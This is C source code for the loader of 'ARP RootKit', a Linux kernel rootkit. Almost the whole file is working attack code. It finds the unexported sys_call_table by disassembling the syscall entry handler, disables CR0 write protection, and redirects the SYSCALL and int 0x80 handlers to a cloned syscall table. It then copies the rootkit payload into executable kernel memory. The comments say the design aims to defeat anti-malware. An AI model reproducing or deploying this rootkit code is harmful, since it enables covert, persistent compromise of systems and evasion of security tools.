/*
 *//* License
 *
 * Copyright (c) 2018 Abel Romero Pérez aka D1W0U <abel@abelromero.com>
 *
 * This file is part of ARP RootKit.
 *
 * ARP RootKit is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * ARP RootKit is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with ARP RootKit.  If not, see <http://www.gnu.org/licenses/>.
 *
 *//* Notes
 *
 * This is the loader. Will get the RootKit Kernel resident into the Linux Kernel.
 * For that, it uses PIC & PIE compilation flags of kernel.c.
 *
 * To hook the syscalls, it needs to find some unexported symbols:
 *  - sys_call_table
 *  - __vmalloc_node_range
 *
 * The code in kernel.c is compiled in the module in the .data section.
 * So we only need to use set_memory_x to test it from inside the LKM (and also to use some functions inside kernel.c).
 * But maybe we can use __vmalloc_node_range() and PAGE_KERNEL_EXEC, to avoid
 * the use of set_memory_x, as we know it's working (because at the beggining of dev I didn't know if the code was working even in the LKM context).
 *
 * set_memory_rw() and "_ro() are implemented by searching change_page_attr_set_clr(),
 * inside set_memory_x() (which is exported, at least in v4.13).
 * But as we couldn't replace the holders of the sys_call_table, to point our own table, I did research.
 * And I found that disabling the 12th bit from CR0, we can write even if it's write-protected =).
 *
 * Atm, the <>_fastpath label on the SYSCALL handler is not used. But it's located and hooked.
 * <>_slowpath is used, and could be also hooked.
 *
 * The interrupt 0x80 is still alive in x86_64, but only on compatibility mode.
 * So, to prevent an anti-malware to use the syscalls in the ia32_sys_call_table, that table is also
 * cloned and hooked.
 *
 * 24/01/2018 - D1W0U
 */

#include <linux/vmalloc.h>
#include <asm/desc.h>
#include <linux/net.h>
#include <asm/msr.h>
#include <linux/slab.h>
#include <linux/namei.h>
#include <linux/proc_fs.h>
#include <linux/pid_namespace.h>
#include <linux/kallsyms.h>
#include <linux/rculist.h>
#include <linux/hash.h>
//#include <linux/sched/signal.h>
#include <linux/module.h>       /* Needed by all modules */
#include <linux/kernel.h>       /* Needed for KERN_INFO */
#include <linux/init.h>         /* Needed for the macros */
#include <linux/version.h> /* For LINUX_VERSION_CODE */
#include <linux/init.h>
#include <linux/syscalls.h>
#include <linux/fcntl.h>
#include <asm/uaccess.h>
#include <capstone.h>

/*
 * Macros
 */
#define PAGE_ROUND_DOWN(x) (((unsigned long)(x)) & (~(PAGE_SIZE-1)))
#define PAGE_ROUND_UP(x) ((((unsigned long)(x)) + PAGE_SIZE-1) & (~(PAGE_SIZE-1)))
#define CPA_ARRAY 2

/*
 * Kernel shared definitions: labels, variables and functions.
 */
#include "kernel.h"

/*
 * Hook handlers, backups, everything about hooking.
 */
#include "hooking.h"

/*
 * Loader declarations.
 */
//void *readfile(const char *file, size_t *len);
int disassemble(void *code, size_t code_len);
void *disass_search_inst_addr(void *code, const char *inst, const char *fmt, size_t max, int position, void **location_addr);
void *disass_search_opstr_addr(void *addr, const char *opstr, const char *fmt, size_t max, int position, void **loc_addr);
void *disass_search_inst_range_addr(void *addr, const char *inst, const char *fmt, size_t max, int position, unsigned long from, unsigned long to, void **loc_addr);
void *search_sct_fastpath(unsigned int **psct_addr);
void *search_sct_slowpath(unsigned int **psct_addr);
void *search_ia32sct_int80h(unsigned int **psct_addr);

void *memmem(const void *haystack, size_t hs_len, const void *needle, size_t n_len);
void hook_kernel_funcs(void);
//int set_memory_rw(unsigned long addr, int pages);
//int set_memory_ro(unsigned long addr, int pages);
//void *search_change_page_attr_set_clr(void *set_memory);
void *search___vmalloc_node_range(void *__vmalloc);
inline unsigned long my_gate_offset(const gate_desc *g);
extern int set_memory_x(unsigned long addr, int numpages);
inline unsigned long long notrace my_rdmsr(unsigned int msr);

/*
 * Global variables.
 */
void (*f_kernel_test)(void) = NULL;
//int (*f_change_page_attr_set_clr)(unsigned long *addr, int numpages, pgprot_t mask_set, pgprot_t mask_clr, int force_split, int in_flag, struct page **pages) = NULL;
void * (*f__vmalloc_node_range)(unsigned long size, unsigned long align,
            unsigned long start, unsigned long end, gfp_t gfp_mask,
            pgprot_t prot, unsigned long vm_flags, int node,
            const void *caller) = NULL;

void disable_wp(void);
void enable_wp(void);

int init_module(void)
{
	size_t kernel_len = 0, kernel_paglen = 0, kernel_pages = 0, my_sct_len = 0;
	void *kernel_addr = NULL, *tmp = NULL;
	long addr = 0;
	int ret = 0;
	size_t off;
    char zero = 0;

    kernel_len = &kernel_end - &kernel_start;
    kernel_paglen = PAGE_ROUND_UP((unsigned long)&kernel_start + (kernel_len - 1)) - PAGE_ROUND_DOWN(&kernel_start);
    kernel_pages = kernel_paglen >> PAGE_SHIFT;

    /*
     * Make our kernel executable, to can use pinfo(), perr().
     */
    set_memory_x(PAGE_ROUND_DOWN(&kernel_start), kernel_pages);

	/*
	 * Load Linux Kernel exported symbols for our rootkit.
	 */
    f_kmalloc = kmalloc;
    f_kfree = kfree;
    f_find_vpid = find_vpid;
    f_vscnprintf = vscnprintf;

	f_sys_write = kallsyms_lookup_name("sys_write");

	/*
	 * Search sys_call_table[] address.
	 */
	tmp = search_sct_fastpath(&psct_fastpath);
	if (tmp == NULL) {
		return 0;
	}
	if (search_sct_slowpath(&psct_slowpath) != tmp) {
		return 0;
	}
	sys_call_table = tmp;

	/*
     * Linux Kernel syscall symbols for our rootkit.
     */
    f_sys_write = sys_call_table[__NR_write]; // now we can print into stdout and stderr =)

	pinfo("Hurra! sys_call_table = %p, fastpath_location = %p, slowpath_location = %p\n", sys_call_table, psct_fastpath, psct_slowpath);

	/*
	 * Search not exported symbols.
	 */
	/*
	f_change_page_attr_set_clr = search_change_page_attr_set_clr(set_memory_x);
	if (f_change_page_attr_set_clr != NULL) {
		pinfo("Hurra! change_page_attr_set_clr() = %p\n", f_change_page_attr_set_clr);
	} else {
		perr("Sorry, can't find change_page_attr_set_clr().\n");
		return 0;
	}
	*/
	f__vmalloc_node_range = search___vmalloc_node_range(__vmalloc);
	if (f__vmalloc_node_range != NULL) {
		pinfo("Hurra! __vmalloc_node_range() = %p\n", f__vmalloc_node_range);
	} else {
		perr("Sorry, can't find __vmalloc_node_range().\n");
		return 0;
	}

	/*
	 * Reserve & clone a new (our) sys_call_table.
	 */
	while(sys_call_table[my_sct_len]) {
		my_sct_len ++;
	}
	pinfo("sys_call_table len = %d\n", my_sct_len);

	my_sct = f__vmalloc_node_range(PAGE_ROUND_UP(my_sct_len * sizeof(void *)), 1,
                    MODULES_VADDR,
                    MODULES_END, GFP_KERNEL,
                    PAGE_KERNEL, 0, NUMA_NO_NODE,
                    __builtin_return_address(0));

	if (my_sct == NULL) {
		perr("Sorry, can't reserve memory with __vmalloc_node_range().\n");
		return 0;
	}

	// zero memory
	for(zero = 0, off = 0; off < PAGE_ROUND_UP(my_sct_len * sizeof(void *)); off ++) {
		ret = probe_kernel_write((void *)((long)my_sct + off), &zero, sizeof(char));
		if (ret != 0) {
			perr("Sorry, can't zero memory for our sct.\n");
			return 0;
		}
	}
	pinfo("my_sct zeroed!\n");

	my_sct_len = 0;
	while(sys_call_table[my_sct_len]) {
		ret = probe_kernel_write(&my_sct[my_sct_len], &sys_call_table[my_sct_len], sizeof(long));
		if (ret != 0) {
			perr("Sorry, can't clone sys_call_table.\n");
			return 0;
		}
		//my_sct[my_sct_len] = sys_call_table[my_sct_len];
		my_sct_len ++;
	}

	pinfo("my_sct = %p, len = %d\n", my_sct, my_sct_len);

	/*
	 * Install the new sct into SYSCALL handler.
	 */
	pinfo("before psct_fastpath = %x, psct_slowpath = %x\n", *psct_fastpath, *psct_slowpath);
	addr = (int) my_sct;
	disable_wp();
	ret = probe_kernel_write(psct_fastpath, &addr, sizeof(int));
	ret = probe_kernel_write(psct_slowpath, &addr, sizeof(int));
	enable_wp();
	if (ret != 0) {
		perr("Sorry, error while replacing sys_call_table on SYSCALL handler.\n");
		return 0;
	}
	pinfo("after psct_fastpath = %x, psct_slowpath = %x\n", *psct_fastpath, *psct_slowpath);

	/*
	 * Install the new sct into int $0x80.
	 */
	ia32_sys_call_table = search_ia32sct_int80h(&pia32sct);
	pinfo("ia32_sys_call_table = %p, ia32sct_location = %p\n", ia32_sys_call_table, pia32sct);

/*
	// restore SYSCALL handler
	addr = (int) sys_call_table;
    disable_wp();
    ret = probe_kernel_write(psct_fastpath, &addr, sizeof(int));
	ret = probe_kernel_write(psct_slowpath, &addr, sizeof(int));
    enable_wp();

	pinfo("restored psct_fastpath = %x, psct_slowpath = %x\n", *psct_fastpath, *psct_slowpath);
*/


/*
	pinfo("%p\n", __rdmsr(MSR_LSTAR));
	char *p = __rdmsr(MSR_LSTAR);
	p[0] = 0x90;
	disassemble(p, 1);
*/
/*	
	unsigned long mstart = (unsigned long)get_cpu_entry_area(nr_cpu_ids);
	unsigned long mend = (unsigned long)get_cpu_entry_area(nr_cpu_ids + 1) - PAGE_SIZE;
	size_t msize = mend - mstart;
	pinfo("mstart = %p, mend = %p, size = %d, pages = %d\n", mstart, mend, msize, msize / PAGE_SIZE);
	void *p = f__vmalloc_node_range(PAGE_SIZE, 1,
                    mstart,
                    mend, GFP_KERNEL,
                    PAGE_KERNEL_EXEC, 0, NUMA_NO_NODE,
                    __builtin_return_address(0));
	pinfo("%p\n", p);
	if (p != NULL)
		(*f_kfree())(p);

	int i = 0;
	for(; i < nr_cpu_ids; i++) {
		unsigned long p = __rdmsr(MSR_LSTAR);
		pinfo("MSR_LSTAR = %p, cpu_entry_area(%d) = %p, offset = %lx\n", p, i, get_cpu_entry_area(i), p - (unsigned long)get_cpu_entry_area(i));
		disassemble((unsigned long)get_cpu_entry_area(i) + 0x5000, 0x3c);
	}
*/

	//printk("kernel_len = %d, kernel_paglen = %d, kernel_pages = %d, kernel_addr = %p, kernel_pagdown_addr = %p\n", kernel_len, kernel_paglen, kernel_pages, &kernel_start, PAGE_ROUND_DOWN(&kernel_start));

	/*
     * Insert out rootkit into memory.
	 */
	pinfo("kernel_len = %d, kernel_paglen = %d, kernel_pages = %d, kernel_start = %p, kernel_start_pagdown = %p\n", kernel_len, kernel_paglen, kernel_pages, &kernel_start, PAGE_ROUND_DOWN(&kernel_start));
	kernel_addr = f_kmalloc(kernel_paglen, GFP_KERNEL);
	if (kernel_addr != NULL) {
		pinfo("kernel_addr = %p, kernel_addr_pagdown = %p\n", kernel_addr, PAGE_ROUND_DOWN(kernel_addr));
		/*
		 * Make our rootkit code executable.
		 */
		ret = set_memory_x(PAGE_ROUND_DOWN(kernel_addr), kernel_pages);
		pinfo("ret = %d\n", ret);
		//pinfo("kernel_addr's pages are now executable.\n");
		
		ret = probe_kernel_write(kernel_addr, &kernel_start, kernel_len);
		if (ret != 0) {
			perr("Sorry, can't copy kernel to its place.\n");
			return 0;
		}
		//memcpy(kernel_addr, &kernel_start, kernel_len);
		//pinfo("kernel is now copied to kernel_addr.\n");
		
		//disassemble(kernel_addr + ((unsigned long)&kernel_code_start - (unsigned long)&kernel_start), ((unsigned long)&kernel_end - (unsigned long)&kernel_code_start));

		kernel_test();

		//pinfo("kernel_test execution from LKM successful.\n");

		f_kernel_test = kernel_addr + ((unsigned long)&kernel_test - (unsigned long)&kernel_start);
		//pinfo("f_kernel_test at %p\n", f_kernel_test);
		f_kernel_test();
		pinfo("f_kernel_test execution from allocated code, successful.\n");

		//hook_kernel_funcs();

		//pinfo("ARPRootKit successfully installed!\n");

		// uncomment for testing:
		//(*f_kfree())(kernel_addr);

	} else {
		perr("can not allocate memory.\n");
	}

    return 0;
}

void cleanup_module(void)
{
}

// from http://vulnfactory.org/blog/2011/08/12/wp-safe-or-not/
void disable_wp(void) {
    asm("cli\n\tmov\t%cr0, %rax\n\tand\t$0xfffffffffffeffff, %rax\n\tmov\t%rax, %cr0\n\tsti");
}

void enable_wp(void) {
    asm("cli\n\tmov\t%cr0, %rax\n\tor\t$0x10000, %rax\n\tmov\t%rax, %cr0\n\tsti");
}

void *disass_search_inst_range_addr(void *addr, const char *inst, const char *fmt, size_t max, int position, unsigned long from, unsigned long to, void **loc_addr) {
    csh handle;
    cs_insn *insn;
    void *addr_found = NULL;
    size_t count, j, i, code_len, dist;
    int pos_count = 0;

    if (cs_open(CS_ARCH_X86, CS_MODE_64, &handle) != CS_ERR_OK) {
        perr("cs_open() error\n");
        return NULL;
    }

    cs_option(handle, CS_OPT_SYNTAX, CS_OPT_SYNTAX_ATT); // CS_OPT_SYNTAX_ATT represents AT&T syntax

    for (code_len = 15; 1; code_len += 15) {
        count = cs_disasm(handle, addr, code_len, (unsigned long)addr, 0, &insn);
        pinfo("%d instructions disassembled.\n", count);
        if (count > 0) {
            for (j = 0; j < count; j++) {
                pinfo("0x%"PRIx64":\t%s\t\t%s\n", insn[j].address, insn[j].mnemonic, insn[j].op_str);
                for (i = 0; i < insn[j].size; i++) {
                    pinfo("%02x ", insn[j].bytes[i]);
                }
                pinfo("\n");
                if (strlen(insn[j].mnemonic) >= strlen(inst) && strncmp(insn[j].mnemonic, inst, strlen(inst)) == 0) {
					sscanf(insn[j].op_str, fmt, &addr_found);
					if (addr_found != NULL) {
						dist = (unsigned long)addr_found - insn[j].address;
						pinfo("DIST = %lx\n", dist);
						if ((dist >= from && dist <= to) || ((dist * -1) >= from && (dist * -1) <= to)) {
							pos_count ++;
		                    if (pos_count == position) {
                        		pinfo("%s found! addr = %p\n", inst, addr_found);
		                        *loc_addr = (void *) insn[j].address + (insn[j].size - sizeof(int));
        		                cs_free(insn, count);
                		        cs_close(&handle);
								return addr_found;
							}
						}
                    }
                }
            }
            cs_free(insn, count);
			pos_count = 0;
			addr_found = NULL;
        } else {
            pinfo("ERROR: Failed to disassemble given code!\n");
            cs_close(&handle);
            return NULL;
        }
        if (code_len >= max) {
            break;
        }
    }

    cs_close(&handle);

    return NULL;
}

void *disass_search_inst_addr(void *addr, const char *inst, const char *fmt, size_t max, int position, void **loc_addr) {
    csh handle;
    cs_insn *insn;
	void *addr_found = NULL;
    size_t count;
    size_t j, i;
	size_t code_len;
	int pos_count = 0;

	if (cs_open(CS_ARCH_X86, CS_MODE_64, &handle) != CS_ERR_OK) {
        perr("cs_open() error\n");
        return NULL;
    }

    cs_option(handle, CS_OPT_SYNTAX, CS_OPT_SYNTAX_ATT); // CS_OPT_SYNTAX_ATT represents AT&T syntax

	for (code_len = 15; 1; code_len += 15) {
	    count = cs_disasm(handle, addr, code_len, (unsigned long)addr, 0, &insn);
	    pinfo("%d instructions disassembled.\n", count);
	    if (count > 0) {
	        for (j = 0; j < count; j++) {
	            pinfo("0x%"PRIx64":\t%s\t\t%s\n", insn[j].address, insn[j].mnemonic, insn[j].op_str);
	            for (i = 0; i < insn[j].size; i++) {
        	        pinfo("%02x ", insn[j].bytes[i]);
				}
            	pinfo("\n");
                if (strlen(insn[j].mnemonic) >= strlen(inst) && strncmp(insn[j].mnemonic, inst, strlen(inst)) == 0) {
                    pos_count ++;
                    if (pos_count == position) {
						sscanf(insn[j].op_str, fmt, &addr_found);
                        //int r = kstrtou64(insn[j].op_str, 16, (u64 *)&addr_found);
                        //pinfo("r %d %p\n", r, addr_found);
                        pinfo("%s found! addr = %p\n", inst, addr_found);
						*loc_addr = (void *) insn[j].address + (insn[j].size - sizeof(int));
                        cs_free(insn, count);
                        cs_close(&handle);
                        return addr_found;
                    }
                }
        	}
        	cs_free(insn, count);
			pos_count = 0;
	    } else {
    	    pinfo("ERROR: Failed to disassemble given code!\n");
	        cs_close(&handle);
	        return NULL;
	    }
		if (code_len >= max) {
			break;
		}
	}

    cs_close(&handle);

    return NULL;
}

void *disass_search_opstr_addr(void *addr, const char *opstr, const char *fmt, size_t max, int position, void **loc_addr) {
    csh handle;
    cs_insn *insn;
    void *addr_found = NULL;
    size_t count;
    size_t j, i;
    size_t code_len;
    int pos_count = 0;

    if (cs_open(CS_ARCH_X86, CS_MODE_64, &handle) != CS_ERR_OK) {
        perr("cs_open() error\n");
        return NULL;
    }

    cs_option(handle, CS_OPT_SYNTAX, CS_OPT_SYNTAX_ATT); // CS_OPT_SYNTAX_ATT represents AT&T syntax

    for (code_len = 15; 1; code_len += 15) {
        count = cs_disasm(handle, addr, code_len, (unsigned long)addr, 0, &insn);
        pinfo("%d instructions disassembled.\n", count);
        if (count > 0) {
            for (j = 0; j < count; j++) {
                pinfo("0x%"PRIx64":\t%s\t\t%s\n", insn[j].address, insn[j].mnemonic, insn[j].op_str);
                for (i = 0; i < insn[j].size; i++) {
                    pinfo("%02x ", insn[j].bytes[i]);
                }
                pinfo("\n");
                if (strlen(insn[j].op_str) >= strlen(opstr) && memmem(insn[j].op_str, strlen(insn[j].op_str), opstr, strlen(opstr)) != NULL) {
                    pos_count ++;
                    if (pos_count == position) {
                        sscanf(insn[j].op_str, fmt, &addr_found);
                        //int r = kstrtou64(insn[j].op_str, 16, (u64 *)&addr_found);
                        //pinfo("r %d %p\n", r, addr_found);
                        pinfo("%s found! addr = %p\n", opstr, addr_found);
                        *loc_addr = (void *) insn[j].address + (insn[j].size - sizeof(int));
                        cs_free(insn, count);
                        cs_close(&handle);
                        return addr_found;
                    }
                }
            }
            cs_free(insn, count);
			pos_count = 0;
        } else {
            pinfo("ERROR: Failed to disassemble given code!\n");
            cs_close(&handle);
            return NULL;
        }
        if (code_len >= max) {
            break;
        }
    }

    cs_close(&handle);

    return NULL;
}

/*	
void *search_change_page_attr_set_clr(void *set_memory) {
	void *tmp;
	void *addr = disass_search_inst_addr(set_memory, "call", "%lx", 0x100, 1, &tmp);
	return addr;
}
*/

void *search___vmalloc_node_range(void *__vmalloc) {
	void *tmp;
	void *addr = disass_search_inst_addr(__vmalloc, "call", "%lx", 0x100, 1, &tmp);
	return addr;
}

/*
static inline int f_change_page_attr_set(unsigned long *addr, int numpages,
                       pgprot_t mask, int array)
{
    return f_change_page_attr_set_clr(addr, numpages, mask, __pgprot(0), 0,
        (array ? CPA_ARRAY : 0), NULL);
}

static inline int f_change_page_attr_clear(unsigned long *addr, int numpages,
                     pgprot_t mask, int array)
{
    return f_change_page_attr_set_clr(addr, numpages, __pgprot(0), mask, 0,
        (array ? CPA_ARRAY : 0), NULL);
}

int set_memory_rw(unsigned long addr, int numpages) {
	return f_change_page_attr_set(&addr, numpages, __pgprot(_PAGE_RW), 0);
}

int set_memory_ro(unsigned long addr, int numpages) {
	return f_change_page_attr_clear(&addr, numpages, __pgprot(_PAGE_RW), 0);
}
*/

void hook_kernel_funcs(void) {
	disassemble(sock_recvmsg, 0x20);
}

int disassemble(void *code, size_t code_len) {
	csh handle;
	cs_insn *insn;
	size_t count;
	size_t j, i;
	if (cs_open(CS_ARCH_X86, CS_MODE_64, &handle) != CS_ERR_OK) {
		perr("cs_open() error\n");
		return -1;
	}

	cs_option(handle, CS_OPT_SYNTAX, CS_OPT_SYNTAX_ATT); // CS_OPT_SYNTAX_ATT represents AT&T syntax

	count = cs_disasm(handle, code, code_len, (unsigned long)code, 0, &insn);
	pinfo("%d instructions disassembled.\n", count);
	if (count > 0) {
		for (j = 0; j < count; j++) {
			pinfo("0x%"PRIx64":\t%s\t\t%s\n", insn[j].address, insn[j].mnemonic, insn[j].op_str);
			for (i = 0; i< insn[j].size; i++) {
				pinfo("%02x ", insn[j].bytes[i]);
			}
			pinfo("\n");
		}
		cs_free(insn, count);
	} else {
		pinfo("ERROR: Failed to disassemble given code!\n");
		cs_close(&handle);
		return -1;
	}
	cs_close(&handle);

	return 0;
}

void *memmem(const void *haystack, size_t hs_len, const void *needle, size_t n_len) {
    while (hs_len >= n_len) {
        hs_len--;
        if (!memcmp(haystack, needle, n_len))
            return (void *)haystack;
        haystack++;
    }
    return NULL;
}

void *search_ia32sct_int80h(unsigned int **psct_addr) {
	void *ia32sct = NULL;
    struct desc_ptr idtr;
    gate_desc *idt = NULL;

    store_idt(&idtr);
    pinfo("IDT address = %p, size = %d\n", idtr.address, idtr.size);
    idt = (gate_desc *) idtr.address;
    ia32sct = (0xffffffffffffffff - (0 - (unsigned int)my_gate_offset(&idt[0x80])) + 1);
    pinfo("int 0x80 handler address = %p\n", ia32sct);
	//ia32sct = disass_search_inst_addr(ia32sct, "call", "%lx", 0x100, 2, (void **)psct_addr);
	ia32sct = disass_search_inst_range_addr(ia32sct, "call", "%lx", 0x300, 1, 0x6f0000, 0xa10000, (void **)psct_addr);
	if (ia32sct != NULL) {
		ia32sct = disass_search_inst_addr(ia32sct, "call", "*-%lx(", 0x100, 1, (void **)psct_addr);
		if (ia32sct != NULL) {
			ia32sct = (void *)((long) ia32sct * -1);
			return ia32sct;
		}
	}

	return NULL;
}

void *search_sct_fastpath(unsigned int **psct_addr) {
	void *sct = (void *) my_rdmsr(MSR_LSTAR);
	void *tmp = NULL;
	// DO NOT call disassemble() in this function as sys_write is not yet imported!
	// or import sys_write into f_sys_write before calling:
	//*f_sys_write() = kallsyms_lookup_name("sys_write");
	//disassemble(sct, 0x100);
	tmp = memmem(sct, 0x100, "\x48\xc7\xc7", 3); // search: mov $address, %rdi; jmp *%rdi
	if (tmp != NULL && memcmp(tmp + 3 + 4, "\xff\xe7", 2) == 0) { // found!
		sct = tmp;
		sct += 3;
		sct = (void *) (0xffffffffffffffff - (0 - *(unsigned int *) sct) + 1) + (2 + 1 + 0x31);
	} else {
		pinfo("kernel version might be <= 4.11 on (search_sct_fastpath()).\n");
	}

	//disassemble(sct, 0x200);
	tmp = disass_search_opstr_addr(sct, "(, %rax, 8)", "*-%x", 0x200, 1, (void **)psct_addr); // search for a direct call with offset
	if (tmp == NULL) {
		tmp = disass_search_opstr_addr(sct, "(, %rax, 8)", "-%x", 0x200, 1, (void **)psct_addr); // search for a mov with offset
	}
	if (tmp != NULL) {
		sct = tmp;
		sct = (void *) ((long) sct * -1);
		return sct;
	} else{
		// can't write without sys_write() :(
		perr("Sorry! call not found when searching sct in fastpath.\n");
	}

	return NULL;
}

// v4.13.0-31: 2nd call to distance >= 0x6f0000 <= 0xa10000
void *search_sct_slowpath(unsigned int **psct_addr) {
	void *sct = (void *) my_rdmsr(MSR_LSTAR);
	void *tmp = NULL;
	tmp = memmem(sct, 0x100, "\x48\xc7\xc7", 3); // search: mov $address, %rdi; jmp *%rdi
	if (tmp != NULL && memcmp(tmp + 3 + 4, "\xff\xe7", 2) == 0) { // found!
		sct = tmp;
		sct += 3;
		sct = (void *) (0xffffffffffffffff - (0 - *(unsigned int *) sct) + 1);
	} else {
		pinfo("kernel version might be <= 4.11 on (search_sct_slowpath()).\n");
	}
	tmp = disass_search_inst_range_addr(sct, "call", "%lx", 0x300, 2, 0x6f0000, 0xa10000, (void **)psct_addr);
	if (tmp != NULL) {
		sct = tmp;
		pinfo("do_syscall_64 at %p\n", sct);
		tmp = disass_search_inst_addr(sct, "call", "*-%lx(", 0x100, 1, (void **)psct_addr);
		if (tmp != NULL) {
			sct = tmp;
			sct = (void *)((long) sct * -1);
			return sct;
		} else {
			perr("Sorry, can't locate call with sys_call_table.\n");
		}
	} else {
		perr("Sorry, can't locate do_syscall_64.\n");
	}
	return NULL;
}

inline unsigned long my_gate_offset(const gate_desc *g)
{
#ifdef CONFIG_X86_64
    return g->offset_low | ((unsigned long)g->offset_middle << 16) |
        ((unsigned long) g->offset_high << 32);
#else
    return g->offset_low | ((unsigned long)g->offset_middle << 16);
#endif
}

inline unsigned long long notrace my_rdmsr(unsigned int msr)
{
    DECLARE_ARGS(val, low, high);

    asm volatile("1: rdmsr\n"
             "2:\n"
             _ASM_EXTABLE_HANDLE(1b, 2b, ex_handler_rdmsr_unsafe)
             : EAX_EDX_RET(val, low, high) : "c" (msr));

    return EAX_EDX_VAL(val, low, high);
}

MODULE_LICENSE("GPL");
//MODULE_AUTHOR("Abel Romero Pérez aka D1W0U <abel@abelromero.com>");
//MODULE_DESCRIPTION("This is the loader of the rootkit's kernel (kernel.c).");
